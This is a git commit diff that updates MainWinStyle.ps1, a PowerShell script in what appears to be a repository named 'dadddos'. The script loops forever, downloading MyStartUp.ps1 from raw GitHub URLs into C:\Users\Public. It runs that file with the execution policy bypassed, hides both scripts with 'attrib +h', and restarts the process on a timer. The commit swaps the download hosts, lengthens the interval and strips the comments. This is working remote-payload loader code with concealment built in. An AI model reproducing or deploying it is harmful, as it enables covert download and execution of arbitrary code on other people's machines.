a99adb1d74d22d5ed8b99fb5c449e19309c3ae6e
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-06 05:48:04 -0300

    Update MainWinStyle.ps1

--- MainWinStyle.ps1
+++ MainWinStyle.ps1
@@ -1,11 +1,11 @@
-$downloadUrl = "https://public.dm.files.1drv.com/y4mJ2EGMqR-to1OyxXy5put3-PTvYmR3zM7K4q69FqHHnHCmvzRT7iw263Y4-ZaoIYRloU9nUuITH79xQUUjDsUuejf9UU0G-ApHIjG4sEYsWHRFjI85sw9t325vVd5z0Ym2pi9_uRK2vBq0OWT6BcfdsakqhUg7HWWwbPqZpLbSzoivAtTtVVuZDUKSBc4JAvjZcHGGyDsbSLmEqz_fxOZw2BQN3yvkva9DErxmLuCMh0?AVOverride=1"
-$down = "https://raw.githubusercontent.com/fullcaleta/dadddos/main/MyStartUp.ps1"
+$downloadUrl = "https://raw.githubusercontent.com/fullcaleta/dadddos/main/MyStartUp.ps1"
+$down = "https://raw.githubusercontent.com/fullcaletaxixth/dadddos/main/MyStartUp.ps1"
 
 
 $filePath = "C:\Users\Public\MyStartUp.ps1"
-$verifyInterval = 150
+$verifyInterval = 220
 
-# Variables para rastrear el PID anterior
+
 $previousPID = $null
 
 while ($true) {
@@ -33,15 +33,13 @@ while ($true) {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath  
     } 
 
-    if (Test-Path "C:\Users\Public\MyStartUp.ps1") {
+    if (-not (Test-Path "C:\Users\Public\MyStartUp.ps1")) {
     Start-Sleep 5
     Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
-    } else {
-    Start-Sleep 8
-    Invoke-WebRequest -Uri $down -OutFile $filePath
     }
+    
     Start-Sleep 8.8
-    # Ejecutar el archivo descargado si existe
+   
     if (Test-Path -Path $filePath) {
         $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$filePath`"" -PassThru
         $previousPID = $process.Id
@@ -49,10 +47,10 @@ while ($true) {
 	attrib +h C:\Users\Public\MainWinStyle.ps1
 	attrib +h C:\Users\Public\MyStartUp.ps1
 
-    # Esperar el intervalo de iteración
+
     Start-Sleep -Seconds $verifyInterval
 
-    # Terminar el proceso anterior si existe
+
     if ($previousPID -ne $null -and (Get-Process -Id $previousPID -ErrorAction SilentlyContinue)) {
         Stop-Process -Id $previousPID -Force
 	Start-Sleep 9.6
